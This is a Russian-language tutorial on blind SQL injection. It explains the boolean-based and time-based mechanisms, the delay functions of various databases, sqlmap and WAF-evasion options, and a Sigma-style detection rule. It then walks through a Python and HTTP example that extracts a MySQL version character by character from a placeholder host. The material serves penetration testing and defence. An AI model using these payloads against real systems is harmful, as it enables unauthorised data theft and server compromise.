# Blind SQLi: Boolean-based и Time-based техники

## Контекст и базовые понятия

Blind SQL Injection (слепая SQL-инъекция) представляет собой класс уязвимостей, при котором атакующий извлекает данные из базы данных без прямого отображения результатов запроса в ответе веб-приложения. В отличие от классической инъекции, где ошибка SQL или вывод данных напрямую виден в HTML-странице, в слепом сценарии приложение либо не выдает никакой информации, либо возвращает стандартные ответы (например, «Страница не найдена» или «Доступ разрешен»), скрывая детали выполнения SQL-запроса. Это делает традиционные методы эксплуатации, основанные на анализе визуальных различий или парсинге ошибок, неэффективными.

Слепая инъекция опирается на косвенные индикаторы. Атакующий формулирует логические условия, которые влияют на поведение приложения. Если условие истинно, приложение ведет себя одним образом (например, возвращает код 200 OK или отображает контент пользователя). Если условие ложно, поведение меняется (код 404, пустой список, задержка времени). Эти различия в поведении служат каналом передачи данных.

Ключевое разграничение необходимо проводить между тремя понятиями, которые часто путают в общей терминологии «SQLi»:

1.  **In-band SQLi (In-band Injection):** Атакующий использует один и тот же канал связи для запуска атаки и получения результатов. Сюда входят *Error-based* (вывод через сообщения об ошибках СУБД) и *Union-based* (объединение результатов через оператор UNION). Это самый быстрый и простой тип, но он требует видимости вывода.
2.  **Blind SQLi (Blind Injection):** Канал вывода данных отделен от канала ввода. Данные извлекаются путем наблюдения за косвенными признаками (логика приложения или время отклика). Требует автоматизации, так как ручной перебор символов невозможен из-за огромного объема запросов.
3.  **Out-of-band SQLi (OOB Injection):** Данные извлекаются через альтернативные протоколы (DNS, HTTP, SMTP), инициируемые самой СУБД. Используется, когда ни in-band, ни blind каналы не доступны или слишком медленны.

Blind SQLi делится на два основных подкласса в зависимости от типа наблюдаемого индикатора:
*   **Boolean-based Blind SQLi:** Индикатором является изменение логического состояния приложения (истина/ложь), обычно проявляющееся в различии контента ответа.
*   **Time-based Blind SQLi:** Индикатором является задержка времени выполнения запроса. Приложение может возвращать идентичный контент, но время отклика будет разным в зависимости от истинности условия.

| Характеристика | In-band SQLi | Boolean-based Blind SQLi | Time-based Blind SQLi |
| :--- | :--- | :--- | :--- |
| **Канал вывода** | Тот же, что и ввод (HTTP response body/errors) | Косвенный (логика приложения, длина ответа, статус) | Косвенный (время отклика сервера) |
| **Видимость данных** | Прямая (данные видны сразу) | Косвенная (побитовое извлечение) | Косвенная (побитовое извлечение) |
| **Скорость** | Высокая | Низкая (требует много запросов) | Очень низкая (зависит от задержек сети/СУБД) |
| **Зависимость от кода** | Зависит от обработки ошибок/вывода | Зависит от ветвления логики (if/else) | Зависит от поддержки функций задержки СУБД |
| **Типичные индикаторы** | Ошибки SQL, UNION-результаты | Разный HTML, разный HTTP-статус, разная длина | `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()` |
| **Сложность эксплуатации** | Низкая | Средняя (требует автоматизации) | Высокая (шум в сети, нестабильность) |

Blind SQLi возникает, когда разработчики применяют фильтрацию входных данных, скрывающую ошибки, или используют параметризованные запросы только для части данных, оставляя уязвимыми динамические части запроса, но блокируя прямой вывод. Также это часто встречается в API, где JSON-ответы не содержат деталей SQL-ошибок, но логика приложения зависит от результата запроса (например, проверка прав доступа).

## Внутреннее устройство предмета

Blind SQLi базируется на механизме выполнения SQL-запросов, где результат булевого выражения влияет на поток выполнения приложения. Внутреннее устройство этого процесса включает три уровня: уровень СУБД (вычисление условия), уровень приложения (интерпретация результата) и уровень сети (передача ответа).

### Механизм Boolean-based Blind SQLi

Boolean-based техника использует логические операторы (`AND`, `OR`, `CASE`, `IF`) для создания условий, которые возвращают `TRUE` или `FALSE`. Приложение, получая результат выполнения запроса, реагирует на него по-разному.

**Архитектура атаки:**
1.  **Входная точка:** Параметр, который интерпретируется СУБД как часть SQL-запроса (например, `id` в `SELECT * FROM users WHERE id = [INPUT]`).
2.  **Контекст инъекции:** Атакующий должен определить тип кавычек (одинарные `'`, двойные `"`, обратные `` ` ``) и структуру запроса. Если запрос имеет вид `SELECT * FROM users WHERE id = '1'`, инъекция должна закрыть кавычку: `' AND ... -- -`.
3.  **Булевый предикат:** Вставка условия, которое истинно только при выполнении определенного требования (например, `ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 97`).
4.  **Индикатор (Oracle):** Приложение возвращает разные ответы для `TRUE` и `FALSE`.
    *   *TRUE:* Отображается профиль пользователя, код 200, длина тела ответа $L_{true}$.
    *   *FALSE:* Отображается страница ошибки, код 403, длина тела ответа $L_{false}$.

**Особенности реализации:**
*   **Бинарный поиск:** Для извлечения одного символа требуется $\lceil \log_2(N) \rceil$ запросов, где $N$ — размер алфавита (например, 256 для байтов). Для ASCII-символов это около 8 запросов на символ.
*   **Каскадные условия:** Для проверки нескольких символов используются цепочки `AND`.
*   **Обход фильтрации:** СУБД может игнорировать комментарии, если они некорректно закрыты, или применять специфические функции преобразования типов.

### Механизм Time-based Blind SQLi

Time-based техника используется, когда приложение не предоставляет логических индикаторов (всегда возвращает одинаковый контент независимо от результата запроса). Здесь используется функция задержки выполнения запроса на стороне СУБД.

**Архитектура атаки:**
1.  **Условная задержка:** Внедрение функции, которая приостанавливает выполнение запроса на заданное время, если условие истинно.
    *   MySQL: `SLEEP(seconds)`
    *   PostgreSQL: `pg_sleep(seconds)`
    *   SQL Server: `WAITFOR DELAY 'hh:mm:ss'`
    *   Oracle: `DBMS_LOCK.SLEEP(seconds)`
2.  **Измерение времени:** Атакующий измеряет время отклика сервера ($T_{response}$).
    *   Если $T_{response} < T_{threshold}$ (порог, например, 0.5 сек), условие ложно.
    *   Если $T_{response} \ge T_{threshold}$, условие истинно.
3.  **Шум и стабильность:** Главный недостаток — зависимость от сетевой задержки (latency), нагрузки на сервер и очереди запросов. Требуется многократное повторение запроса для усреднения времени.

**Сравнение механизмов:**

| Аспект | Boolean-based | Time-based |
| :--- | :--- | :--- |
| **Зависимость от кода** | Требует ветвления логики (if/else) в приложении | Требует поддержки функций задержки в СУБД |
| **Скорость извлечения** | Быстрее (менее запросов) | Медленнее (высокая задержка на каждый запрос) |
| **Надежность** | Выше, если индикатор стабилен | Ниже из-за сетевых колебаний (jitter) |
| **Обнаружение WAF** | Сложнее (трафик выглядит как обычные запросы) | Легче (аномальные задержки могут быть заблокированы) |
| **Применимость** | Когда есть разница в ответах | Когда ответы идентичны |

### Структура запроса и контексты

Для успешной инъекции необходимо точно определить контекст. Ошибка в количестве закрывающих скобок или кавычек приводит к синтаксической ошибке, которая может быть обработана приложением как «общая ошибка», уничтожая индикатор.

Типичные контексты инъекции:
1.  **Внутри строкового литерала:** `WHERE name = 'input'` → `' OR '1'='1`
2.  **Внутри числового литерала:** `WHERE id = input` → `1 OR 1=1`
3.  **Внутри ORDER BY:** `ORDER BY input` → `1 ASC, 2 DESC` (не требует кавычек)
4.  **Внутри функции:** `WHERE id = CONCAT(input, '_suffix')` → `1' UNION SELECT ... --`

**Иллюстративная схема контекста инъекции:**

```text
[Запрос в БД]
SELECT * FROM products WHERE category = '[INPUT]'

[Валидный ввод]
'electronics'

[Синтаксис инъекции]
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' -- -

[Разбор]
' [закрывает строку]
AND (условие) [логическое условие]
-- - [комментирует остаток запроса]
```

## Применение и работа с предметом

На практике работа с Blind SQLi требует использования специализированных инструментов автоматизации, так как ручной перебор символов неэффективен. Инструменты классифицируются по типу детекции индикатора и методам обхода защиты.

### Инструментарий и методы

1.  **sqlmap:** Де-факто стандарт для автоматизации SQLi. Поддерживает оба типа blind-инъекций.
    *   *Флаг `-b`:* Извлечение версии базы данных.
    *   *Флаг `--current-user`:* Определение текущего пользователя СУБД.
    *   *Флаг `--dbs`:* Перечисление баз данных.
    *   *Методы детекции:* `--technique=B` (Boolean), `--technique=T` (Time).
    *   *Обход WAF:* Использование туннелирования через Tor, рандомизации User-Agent, обфускации запросов (`--tamper=space2comment`, `--tamper=charencode`).

2.  **Burp Suite Intruder:** Ручной или полуавтоматический перебор.
    *   Используется для тестирования конкретных параметров, когда sqlmap не справляется с сложной логикой приложения.
    *   *Payload processing:* Использование Groovy-скриптов для динамической генерации payload.
    *   *Grep-match:* Настройка правил для поиска индикаторов (например, изменение длины ответа или наличие специфического текста).

3.  **Custom Scripts (Python/Go):**
    *   Написание кастомных скриптов для обхода сложных механизмов защиты (например, rate-limiting, CAPTCHA, сложная бизнес-логика).
    *   Использование асинхронных запросов для ускорения перебора.

### Типичные ошибки и подводные камни

*   **Неверное определение контекста:** Попытка внедрить код без закрытия кавычки приводит к синтаксической ошибке. Всегда необходимо тестировать на наличие ошибок (например, вводя `'` и `''`).
*   **Игнорирование кодировки:** Некоторые СУБД чувствительны к кодировке (UTF-8, ASCII). Использование неверной кодировки может привести к неверной интерпретации символов.
*   **Ложные срабатывания в Time-based:** Сетевые задержки могут имитировать задержку СУБД. Необходимо устанавливать порог времени с запасом и делать несколько замеров.
*   **Обход WAF:** Современные WAF блокируют ключевые слова (`SLEEP`, `UNION`, `SELECT`). Использование обфускации (например, `SLEEP(0x2a)` вместо `SLEEP(42)`) или кодировки (URL, Base64) может помочь.
*   **Ограничения СУБД:** Некоторые функции задержки имеют ограничения на максимальное время (например, `SLEEP(1000)` может быть обрезано).

### Паттерны использования

1.  **Детекция:** Отправка базовых payload (`'`, `"`, `1=1`, `1=2`) и анализ изменений в ответе (длина, статус, время).
2.  **Определение типа СУБД:** Использование специфичных функций (`@@version` для MySQL, `version()` для PostgreSQL, `@@servername` для SQL Server).
3.  **Перечисление данных:** Построчное извлечение имен таблиц, столбцов и значений.
4.  **Эскалация:** Если есть возможность выполнения системных команд (через `xp_cmdshell` в SQL Server или `INTO OUTFILE` в MySQL), переход к полному компрометации сервера.

**Пример правила детекции (Sigma-подобная структура для SIEM):**

```yaml
title: Potential Boolean-based SQLi
id: 12345678-1234-1234-1234-123456789012
status: experimental
logsource:
  category: web_application
  product: apache
detection:
  selection:
    http_method: 'GET'
    url: '/api/user'
    parameter: 'id'
    payload:
      - "' OR '1'='1"
      - "' AND '1'='1"
  condition: selection
falsepositives:
  - Legitimate search queries
```

## Сквозной практический пример: Извлечение версии базы данных через Boolean-based Blind SQLi

**Исходные условия:**
*   **Среда:** Веб-приложение с уязвимостью в параметре `id` запроса `GET /product?id=1`.
*   **Инструменты:** Burp Suite Professional, Python 3 с библиотекой `requests`.
*   **Роль:** Тестировщик на проникновение.
*   **Сценарий:** Необходимо определить версию MySQL, используя только логические индикаторы (различия в HTML-ответе).

**Шаг 1: Подтверждение уязвимости и определение контекста**

Действие: Отправка запроса с условием, которое всегда истинно, и сравнение с запросом, который всегда ложен.

```http
GET /product?id=1' AND '1'='1 HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0

HTTP/1.1 200 OK
Content-Length: 5120
Content-Type: text/html

<!-- Product details for ID 1 -->
```

```http
GET /product?id=1' AND '1'='2 HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0

HTTP/1.1 200 OK
Content-Length: 1024
Content-Type: text/html

<!-- Product not found -->
```

Ожидаемый вывод: Различие в `Content-Length` (5120 vs 1024) подтверждает, что приложение реагирует на логические условия. Контекст, вероятно, строковый (требуется закрытие кавычки).

**Шаг 2: Извлечение первого символа версии**

Действие: Проверка первого символа версии MySQL. Версия MySQL обычно начинается с цифры (например, '5' или '8'). Используем функцию `SUBSTRING(VERSION(), 1, 1)`.

```python
import requests

url = "http://vulnerable-app.com/product"
params = {"id": "1' AND (ASCII(SUBSTRING(VERSION(), 1, 1)) > 52) -- -"}

response = requests.get(url, params=params)

if response.headers.get('Content-Length') == '5120':
    print("Condition TRUE: First char > '4'")
else:
    print("Condition FALSE: First char <= '4'")
```

Ожидаемый вывод: Если длина ответа 5120, значит первый символ версии больше '4'. Если 1024 — меньше или равно.

**Шаг 3: Бинарный поиск первого символа**

Действие: Уточнение значения символа. Предположим, мы знаем, что версия начинается с '5'. Проверим точное значение.

```python
# Проверка: ASCII('5') = 53
params_true = {"id": "1' AND (ASCII(SUBSTRING(VERSION(), 1, 1)) = 53) -- -"}
params_false = {"id": "1' AND (ASCII(SUBSTRING(VERSION(), 1, 1)) = 54) -- -"}

resp_true = requests.get(url, params=params_true)
resp_false = requests.get(url, params=params_false)

if resp_true.headers.get('Content-Length') == '5120':
    print("First character is '5'")
elif resp_false.headers.get('Content-Length') == '5120':
    print("First character is '6'")
else:
    print("Error or different character")
```

Ожидаемый вывод: Подтверждение первого символа версии.

**Шаг 4: Извлечение следующего символа**

Действие: Переход к следующему символу версии (например, второй символ).

```python
# Проверка второго символа, например, '7' (ASCII 55)
params = {"id": "1' AND (ASCII(SUBSTRING(VERSION(), 2, 1)) = 55) -- -"}
response = requests.get(url, params=params)

if response.headers.get('Content-Length') == '5120':
    print("Second character is '7'")
else:
    print("Second character is not '7'")
```

Ожидаемый вывод: Постепенное построение строки версии (например, '57...' для MySQL 5.7).

**Ожидаемый вывод примера:**
Пример демонстрирует процесс побитового (посимвольного) извлечения данных через логические индикаторы. Атакующий может полностью восстановить версию СУБД, отправив около 8 запросов на каждый символ. В реальном сценарии этот процесс автоматизируется скриптом, который перебирает весь диапазон ASCII-кодов.

## Аналитический вывод

Blind SQL Injection остается критической угрозой, несмотря на широкое распространение параметризованных запросов. Она возникает в ситуациях, где логика приложения зависит от результатов SQL-запроса, но прямой вывод данных скрыт. Boolean-based и Time-based техники дополняют друг друга: первая эффективна при наличии логических индикаторов, вторая — когда индикаторы отсутствуют. Ключевым фактором успешной эксплуатации является точное определение контекста запроса и стабильность индикаторов. Защита от Blind SQLi требует не только использования параметризованных запросов, но и внедрения принципа наименьших привилегий для учетных записей БД, а также мониторинга аномалий в поведении приложения (например, резких изменений в логике ответа или времени отклика). Автоматизированные инструменты, такие как sqlmap, значительно снижают порог входа для атакующих, что делает регулярное тестирование на проникновение обязательным элементом жизненного цикла разработки ПО.
